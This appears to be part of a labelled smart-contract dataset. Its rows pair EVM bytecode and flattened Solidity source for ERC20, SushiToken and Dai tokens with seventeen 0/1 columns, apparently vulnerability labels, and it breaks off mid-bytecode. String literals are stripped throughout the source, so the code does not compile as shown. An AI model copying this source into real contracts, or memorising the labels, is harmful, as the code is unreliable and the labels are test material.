00020819055506109a282600260008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546113c090919063ffffffff16565b600260008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040518082815260200191505060405180910390a3600190509392505050565b601281565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141515610af357600080fd5b610b44816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546113d990919063ffffffff16565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff1660007fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a35050565b670de0b6b3a764000081565b600080600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905080831115610cf7576000600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610d8b565b610d0a83826113c090919063ffffffff16565b600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055505b8373ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546040518082815260200191505060405180910390a3600191505092915050565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b6040805190810160405280600381526020017f514e54000000000000000000000000000000000000000000000000000000000081525081565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614151515610f5b57600080fd5b6000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020548211151515610fa857600080fd5b610ff9826000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546113c090919063ffffffff16565b6000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555061108c826000808673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546113d990919063ffffffff16565b6000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040518082815260200191505060405180910390a36001905092915050565b60006111ce82600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546113d990919063ffffffff16565b600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546040518082815260200191505060405180910390a36001905092915050565b6000600260008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b60008282111515156113ce57fe5b818303905092915050565b60008082840190508381101515156113ed57fe5b80915050929150505600a165627a7a723058204bce3a4b997483544b2195001c91d3290db7fa036a3de40d15ccfd8aa892139d0029,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
"pragma solidity ^0.6.0;abstract contract Context { function _msgSender() internal view virtual returns (address payable) { return msg.sender; } function _msgData() internal view virtual returns (bytes memory) { this; return msg.data; }}pragma solidity ^0.6.0;interface IERC20 { function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function transfer(address recipient, uint256 amount) external returns (bool); function allowance(address owner, address spender) external view returns (uint256); function approve(address spender, uint256 amount) external returns (bool); function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value);}pragma solidity ^0.6.0;library SafeMath { function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; require(c >= a, ); return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { return sub(a, b, ); } function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b <= a, errorMessage); uint256 c = a - b; return c; } function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; require(c / a == b, ); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return div(a, b, ); } function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b > 0, errorMessage); uint256 c = a / b; return c; } function mod(uint256 a, uint256 b) internal pure returns (uint256) { return mod(a, b, ); } function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b != 0, errorMessage); return a % b; }}pragma solidity ^0.6.2;library Address { function isContract(address account) internal view returns (bool) { bytes32 codehash; bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470; assembly { codehash := extcodehash(account) } return (codehash != accountHash && codehash != 0x0); } function sendValue(address payable recipient, uint256 amount) internal { require(address(this).balance >= amount, ); (bool success, ) = recipient.call{ value: amount }(); require(success, ); } function functionCall(address target, bytes memory data) internal returns (bytes memory) { return functionCall(target, data, ); } function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) { return _functionCallWithValue(target, data, 0, errorMessage); } function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) { return functionCallWithValue(target, data, value, ); } function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) { require(address(this).balance >= value, ); return _functionCallWithValue(target, data, value, errorMessage); } function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) { require(isContract(target), ); (bool success, bytes memory returndata) = target.call{ value: weiValue }(data); if (success) { return returndata; } else { if (returndata.length > 0) { assembly { let returndata_size := mload(returndata) revert(add(32, returndata), returndata_size) } } else { revert(errorMessage); } } }}pragma solidity ^0.6.0;contract ERC20 is Context, IERC20 { using SafeMath for uint256; using Address for address; mapping (address => uint256) private _balances; mapping (address => mapping (address => uint256)) private _allowances; uint256 private _totalSupply; string private _name; string private _symbol; uint8 private _decimals; constructor (string memory name, string memory symbol) public { _name = name; _symbol = symbol; _decimals = 18; } function name() public view returns (string memory) { return _name; } function symbol() public view returns (string memory) { return _symbol; } function decimals() public view returns (uint8) { return _decimals; } function totalSupply() public view override returns (uint256) { return _totalSupply; } function balanceOf(address account) public view override returns (uint256) { return _balances[account]; } function transfer(address recipient, uint256 amount) public virtual override returns (bool) { _transfer(_msgSender(), recipient, amount); return true; } function allowance(address owner, address spender) public view virtual override returns (uint256) { return _allowances[owner][spender]; } function approve(address spender, uint256 amount) public virtual override returns (bool) { _approve(_msgSender(), spender, amount); return true; } function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) { _transfer(sender, recipient, amount); _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, )); return true; } function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) { _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue)); return true; } function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) { _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, )); return true; } function _transfer(address sender, address recipient, uint256 amount) internal virtual { require(sender != address(0), ); require(recipient != address(0), ); _beforeTokenTransfer(sender, recipient, amount); _balances[sender] = _balances[sender].sub(amount, ); _balances[recipient] = _balances[recipient].add(amount); emit Transfer(sender, recipient, amount); } function _mint(address account, uint256 amount) internal virtual { require(account != address(0), ); _beforeTokenTransfer(address(0), account, amount); _totalSupply = _totalSupply.add(amount); _balances[account] = _balances[account].add(amount); emit Transfer(address(0), account, amount); } function _burn(address account, uint256 amount) internal virtual { require(account != address(0), ); _beforeTokenTransfer(account, address(0), amount); _balances[account] = _balances[account].sub(amount, ); _totalSupply = _totalSupply.sub(amount); emit Transfer(account, address(0), amount); } function _approve(address owner, address spender, uint256 amount) internal virtual { require(owner != address(0), ); require(spender != address(0), ); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); } function _setupDecimals(uint8 decimals_) internal { _decimals = decimals_; } function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }}pragma solidity ^0.6.0;contract Ownable is Context { address private _owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); constructor () internal { address msgSender = _msgSender(); _owner = msgSender; emit OwnershipTransferred(address(0), msgSender); } function owner() public view returns (address) { return _owner; } modifier onlyOwner() { require(_owner == _msgSender(), ); _; } function renounceOwnership() public virtual onlyOwner { emit OwnershipTransferred(_owner, address(0)); _owner = address(0); } function transferOwnership(address newOwner) public virtual onlyOwner { require(newOwner != address(0), ); emit OwnershipTransferred(_owner, newOwner); _owner = newOwner; }}pragma solidity 0.6.12;contract SushiToken is ERC20(, ), Ownable { function mint(address _to, uint256 _amount) public onlyOwner { _mint(_to, _amount); _moveDelegates(address(0), _delegates[_to], _amount); } mapping (address => address) internal _delegates; struct Checkpoint { uint32 fromBlock; uint256 votes; } mapping (address => mapping (uint32 => Checkpoint)) public checkpoints; mapping (address => uint32) public numCheckpoints; bytes32 public constant DOMAIN_TYPEHASH = keccak256(); bytes32 public constant DELEGATION_TYPEHASH = keccak256(); mapping (address => uint) public nonces; event DelegateChanged(address indexed delegator, address indexed fromDelegate, address indexed toDelegate); event DelegateVotesChanged(address indexed delegate, uint previousBalance, uint newBalance); function delegates(address delegator) external view returns (address) { return _delegates[delegator]; } function delegate(address delegatee) external { return _delegate(msg.sender, delegatee); } function delegateBySig( address delegatee, uint nonce, uint expiry, uint8 v, bytes32 r, bytes32 s ) external { bytes32 domainSeparator = keccak256( abi.encode( DOMAIN_TYPEHASH, keccak256(bytes(name())), getChainId(), address(this) ) ); bytes32 structHash = keccak256( abi.encode( DELEGATION_TYPEHASH, delegatee, nonce, expiry ) ); bytes32 digest = keccak256( abi.encodePacked( , domainSeparator, structHash ) ); address signatory = ecrecover(digest, v, r, s); require(signatory != address(0), ); require(nonce == nonces[signatory]++, ); require(now <= expiry, ); return _delegate(signatory, delegatee); } function getCurrentVotes(address account) external view returns (uint256) { uint32 nCheckpoints = numCheckpoints[account]; return nCheckpoints > 0 ? checkpoints[account][nCheckpoints - 1].votes : 0; } function getPriorVotes(address account, uint blockNumber) external view returns (uint256) { require(blockNumber < block.number, ); uint32 nCheckpoints = numCheckpoints[account]; if (nCheckpoints == 0) { return 0; } if (checkpoints[account][nCheckpoints - 1].fromBlock <= blockNumber) { return checkpoints[account][nCheckpoints - 1].votes; } if (checkpoints[account][0].fromBlock > blockNumber) { return 0; } uint32 lower = 0; uint32 upper = nCheckpoints - 1; while (upper > lower) { uint32 center = upper - (upper - lower) / 2; Checkpoint memory cp = checkpoints[account][center]; if (cp.fromBlock == blockNumber) { return cp.votes; } else if (cp.fromBlock < blockNumber) { lower = center; } else { upper = center - 1; } } return checkpoints[account][lower].votes; } function _delegate(address delegator, address delegatee) internal { address currentDelegate = _delegates[delegator]; uint256 delegatorBalance = balanceOf(delegator); _delegates[delegator] = delegatee; emit DelegateChanged(delegator, currentDelegate, delegatee); _moveDelegates(currentDelegate, delegatee, delegatorBalance); } function _moveDelegates(address srcRep, address dstRep, uint256 amount) internal { if (srcRep != dstRep && amount > 0) { if (srcRep != address(0)) { uint32 srcRepNum = numCheckpoints[srcRep]; uint256 srcRepOld = srcRepNum > 0 ? checkpoints[srcRep][srcRepNum - 1].votes : 0; uint256 srcRepNew = srcRepOld.sub(amount); _writeCheckpoint(srcRep, srcRepNum, srcRepOld, srcRepNew); } if (dstRep != address(0)) { uint32 dstRepNum = numCheckpoints[dstRep]; uint256 dstRepOld = dstRepNum > 0 ? checkpoints[dstRep][dstRepNum - 1].votes : 0; uint256 dstRepNew = dstRepOld.add(amount); _writeCheckpoint(dstRep, dstRepNum, dstRepOld, dstRepNew); } } } function _writeCheckpoint( address delegatee, uint32 nCheckpoints, uint256 oldVotes, uint256 newVotes ) internal { uint32 blockNumber = safe32(block.number, ); if (nCheckpoints > 0 && checkpoints[delegatee][nCheckpoints - 1].fromBlock == blockNumber) { checkpoints[delegatee][nCheckpoints - 1].votes = newVotes; } else { checkpoints[delegatee][nCheckpoints] = Checkpoint(blockNumber, newVotes); numCheckpoints[delegatee] = nCheckpoints + 1; } emit DelegateVotesChanged(delegatee, oldVotes, newVotes); } function safe32(uint n, string memory errorMessage) internal pure returns (uint32) { require(n < 2**32, errorMessage); return uint32(n); } function getChainId() internal pure returns (uint) { uint256 chainId; assembly { chainId := chainid() } return chainId; }}",,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
"pragma solidity ^0.5.0;interface IERC20 { function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function transfer(address recipient, uint256 amount) external returns (bool); function allowance(address owner, address spender) external view returns (uint256); function approve(address spender, uint256 amount) external returns (bool); function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value);}pragma solidity ^0.5.0;library SafeMath { function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; require(c >= a, ); return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { require(b <= a, ); uint256 c = a - b; return c; } function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; require(c / a == b, ); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { require(b > 0, ); uint256 c = a / b; return c; } function mod(uint256 a, uint256 b) internal pure returns (uint256) { require(b != 0, ); return a % b; }}pragma solidity ^0.5.0;contract ERC20 is IERC20 { using SafeMath for uint256; mapping (address => uint256) private _balances; mapping (address => mapping (address => uint256)) private _allowances; uint256 private _totalSupply; function totalSupply() public view returns (uint256) { return _totalSupply; } function balanceOf(address account) public view returns (uint256) { return _balances[account]; } function transfer(address recipient, uint256 amount) public returns (bool) { _transfer(msg.sender, recipient, amount); return true; } function allowance(address owner, address spender) public view returns (uint256) { return _allowances[owner][spender]; } function approve(address spender, uint256 value) public returns (bool) { _approve(msg.sender, spender, value); return true; } function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) { _transfer(sender, recipient, amount); _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount)); return true; } function increaseAllowance(address spender, uint256 addedValue) public returns (bool) { _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue)); return true; } function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) { _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue)); return true; } function _transfer(address sender, address recipient, uint256 amount) internal { require(sender != address(0), ); require(recipient != address(0), ); _balances[sender] = _balances[sender].sub(amount); _balances[recipient] = _balances[recipient].add(amount); emit Transfer(sender, recipient, amount); } function _mint(address account, uint256 amount) internal { require(account != address(0), ); _totalSupply = _totalSupply.add(amount); _balances[account] = _balances[account].add(amount); emit Transfer(address(0), account, amount); } function _burn(address account, uint256 value) internal { require(account != address(0), ); _totalSupply = _totalSupply.sub(value); _balances[account] = _balances[account].sub(value); emit Transfer(account, address(0), value); } function _approve(address owner, address spender, uint256 value) internal { require(owner != address(0), ); require(spender != address(0), ); _allowances[owner][spender] = value; emit Approval(owner, spender, value); } function _burnFrom(address account, uint256 amount) internal { _burn(account, amount); _approve(account, msg.sender, _allowances[account][msg.sender].sub(amount)); }}pragma solidity ^0.5.0;contract TokenMintERC20Token is ERC20 { string private _name; string private _symbol; uint8 private _decimals; constructor(string memory name, string memory symbol, uint8 decimals, uint256 totalSupply, address payable feeReceiver, address tokenOwnerAddress) public payable { _name = name; _symbol = symbol; _decimals = decimals; _mint(tokenOwnerAddress, totalSupply); feeReceiver.transfer(msg.value); } function burn(uint256 value) public { _burn(msg.sender, value); } function name() public view returns (string memory) { return _name; } function symbol() public view returns (string memory) { return _symbol; } function decimals() public view returns (uint8) { return _decimals; }}",,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
"pragma solidity =0.5.12;contract LibNote { event LogNote( bytes4 indexed sig, address indexed usr, bytes32 indexed arg1, bytes32 indexed arg2, bytes data ) anonymous; modifier note { _; assembly { let mark := msize mstore(0x40, add(mark, 288)) mstore(mark, 0x20) mstore(add(mark, 0x20), 224) calldatacopy(add(mark, 0x40), 0, 224) log4(mark, 288, shl(224, shr(224, calldataload(0))), caller, calldataload(4), calldataload(36) ) } }}contract Dai is LibNote { mapping (address => uint) public wards; function rely(address guy) external note auth { wards[guy] = 1; } function deny(address guy) external note auth { wards[guy] = 0; } modifier auth { require(wards[msg.sender] == 1, ); _; } string public constant name = ; string public constant symbol = ; string public constant version = ; uint8 public constant decimals = 18; uint256 public totalSupply; mapping (address => uint) public balanceOf; mapping (address => mapping (address => uint)) public allowance; mapping (address => uint) public nonces; event Approval(address indexed src, address indexed guy, uint wad); event Transfer(address indexed src, address indexed dst, uint wad); function add(uint x, uint y) internal pure returns (uint z) { require((z = x + y) >= x); } function sub(uint x, uint y) internal pure returns (uint z) { require((z = x - y) <= x); } bytes32 public DOMAIN_SEPARATOR; bytes32 public constant PERMIT_TYPEHASH = 0xea2aa0a1be11a07ed86d755c93467f4f82362b452371d1ba94d1715123511acb; constructor(uint256 chainId_) public { wards[msg.sender] = 1; DOMAIN_SEPARATOR = keccak256(abi.encode( keccak256(), keccak256(bytes(name)), keccak256(bytes(version)), chainId_, address(this) )); } function transfer(address dst, uint wad) external returns (bool) { return transferFrom(msg.sender, dst, wad); } function transferFrom(address src, address dst, uint wad) public returns (bool) { require(balanceOf[src] >= wad, ); if (src != msg.sender && allowance[src][msg.sender] != uint(-1)) { require(allowance[src][msg.sender] >= wad, ); allowance[src][msg.sender] = sub(allowance[src][msg.sender], wad); } balanceOf[src] = sub(balanceOf[src], wad); balanceOf[dst] = add(balanceOf[dst], wad); emit Transfer(src, dst, wad); return true; } function mint(address usr, uint wad) external auth { balanceOf[usr] = add(balanceOf[usr], wad); totalSupply = add(totalSupply, wad); emit Transfer(address(0), usr, wad); } function burn(address usr, uint wad) external { require(balanceOf[usr] >= wad, ); if (usr != msg.sender && allowance[usr][msg.sender] != uint(-1)) { require(allowance[usr][msg.sender] >= wad, ); allowance[usr][msg.sender] = sub(allowance[usr][msg.sender], wad); } balanceOf[usr] = sub(balanceOf[usr], wad); totalSupply = sub(totalSupply, wad); emit Transfer(usr, address(0), wad); } function approve(address usr, uint wad) external returns (bool) { allowance[msg.sender][usr] = wad; emit Approval(msg.sender, usr, wad); return true; } function push(address usr, uint wad) external { transferFrom(msg.sender, usr, wad); } function pull(address usr, uint wad) external { transferFrom(usr, msg.sender, wad); } function move(address src, address dst, uint wad) external { transferFrom(src, dst, wad); } function permit(address holder, address spender, uint256 nonce, uint256 expiry, bool allowed, uint8 v, bytes32 r, bytes32 s) external { bytes32 digest = keccak256(abi.encodePacked( , DOMAIN_SEPARATOR, keccak256(abi.encode(PERMIT_TYPEHASH, holder, spender, nonce, expiry, allowed)) )); require(holder != address(0), ); require(holder == ecrecover(digest, v, r, s), ); require(expiry == 0 || now <= expiry, ); require(nonce == nonces[holder]++, ); uint wad = allowed ? uint(-1) : 0; allowance[holder][spender] = wad; emit Approval(holder, spender, wad); }}",0x608060405234801561001057600080fd5b50600436106101425760003560e01c80637ecebe00116100b8578063a9059cbb1161007c578063a9059cbb146106b4578063b753a98c1461071a578063bb35783b14610768578063bf353dbb146107d6578063dd62ed3e1461082e578063f2d5d56b146108a657610142565b80637ecebe00146104a15780638fcbaf0c146104f957806395d89b411461059f5780639c52a7f1146106225780639dc29fac1461066657610142565b8063313ce5671161010a578063313ce567146102f25780633644e5151461031657806340c10f191461033457806354fd4d501461038257806365fae35e1461040557806370a082311461044957610142565b806306fdde0314610147578063095ea7b3146101ca57806318160ddd1461023057806323b872dd1461024e57806330adf81f146102d4575b600080fd5b61014f6108f4565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561018f578082015181840152602081019050610174565b50505050905090810190601f1680156101bc5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b610216600480360360408110156101e057600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061092d565b604051808215151515815260200191505060405180910390f35b610238610a1f565b6040518082815260200191505060405180910390f35b6102ba6004803603606081101561026457600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610a25565b604051808215151515815260200191505060405180910390f35b6102dc610f3a565b6040518082815260200191505060405180910390f35b6102fa610f61565b604051808260ff1660ff16815260200191505060405180910390f35b61031e610f66565b6040518082815260200191505060405180910390f35b6103806004803603604081101561034a57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610f6c565b005b61038a611128565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156103ca5780820151818401526020810190506103af565b50505050905090810190601f1680156103f75780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6104476004803603602081101561041b57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611161565b005b61048b6004803603602081101561045f57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061128f565b6040518082815260200191505060405180910390f35b6104e3600480360360208110156104b757600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506112a7565b6040518082815260200191505060405180910390f35b61059d600480360361010081101561051057600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919080359060200190929190803515159060200190929190803560ff16906020019092919080359060200190929190803590602001909291905050506112bf565b005b6105a76117fa565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156105e75780820151818401526020810190506105cc565b50505050905090810190601f1680156106145780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6106646004803603602081101561063857600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611833565b005b6106b26004803603604081101561067c57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050611961565b005b610700600480360360408110156106ca57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050611df4565b604051808215151515815260200191505060405180910390f35b6107666004803603604081101561073057600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050611e09565b005b6107d46004803603606081101561077e57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050611e19565b005b610818600480360360208110156107ec57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611e2a565b6040518082815260200191505060405180910390f35b6108906004803603604081101561084457600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611e42565b6040518082815260200191505060405180910390f35b6108f2600480360360408110156108bc57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050611e67565b005b6040518060400160405280600e81526020017f44616920537461626c65636f696e00000000000000000000000000000000000081525081565b600081600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925846040518082815260200191505060405180910390a36001905092915050565b60015481565b600081600260008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541015610adc576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260188152602001807f4461692f696e73756666696369656e742d62616c616e6365000000000000000081525060200191505060405180910390fd5b3373ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff1614158015610bb457507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff600360008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205414155b15610db25781600360008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541015610cab576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601a8152602001807f4461692f696e73756666696369656e742d616c6c6f77616e636500000000000081525060200191505060405180910390fd5b610d31600360008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205483611e77565b600360008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055505b610dfb600260008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205483611e77565b600260008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610e87600260008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205483611e91565b600260008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040518082815260200191505060405180910390a3600190509392505050565b7fea2aa0a1be11a07ed86d755c93467f4f82362b452371d1ba94d1715123511acb60001b81565b601281565b60055481565b60016000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205414611020576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260128152602001807f4461692f6e6f742d617574686f72697a6564000000000000000000000000000081525060200191505060405180910390fd5b611069600260008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205482611e91565b600260008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055506110b860015482611e91565b6001819055508173ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a35050565b6040518060400160405280600181526020017f310000000000000000000000000000000000000000000000000000000000000081525081565b60016000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205414611215576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260128152602001807f4461692f6e6f742d617574686f72697a6564000000000000000000000000000081525060200191505060405180910390fd5b60016000808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055505961012081016040526020815260e0602082015260e0600060408301376024356004353360003560e01c60e01b61012085a45050565b60026020528060005260406000206000915090505481565b6004602052806000526040600020600091509